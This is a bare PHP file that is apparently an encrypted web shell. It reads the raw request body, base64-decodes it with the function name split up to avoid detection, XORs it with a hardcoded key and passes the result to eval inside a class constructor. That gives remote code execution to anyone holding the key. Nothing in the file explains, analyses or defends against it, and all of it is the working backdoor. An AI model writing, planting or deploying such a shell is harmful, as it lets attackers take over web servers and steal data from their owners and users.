<?php
@error_reporting(0);
session_start();
$key="900bc885d7553375";
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(isset($post))
{
	$datas=explode("\n",$post);
	$code=$datas[0];
	$t="base64_"."decode";
	$code=$t($code."");
	for($i=0;$i<strlen($code);$i++) {
    	$code[$i] = $code[$i]^$key[$i+1&15]; 
    }
    $arr=explode('|',$code);
    $func=$arr[0];
    if(isset($arr[1])){
 		$p=$arr[1];
		class C{public function __construct($p) {eval($p."");}}
		@new C($p);
    }
}
?>
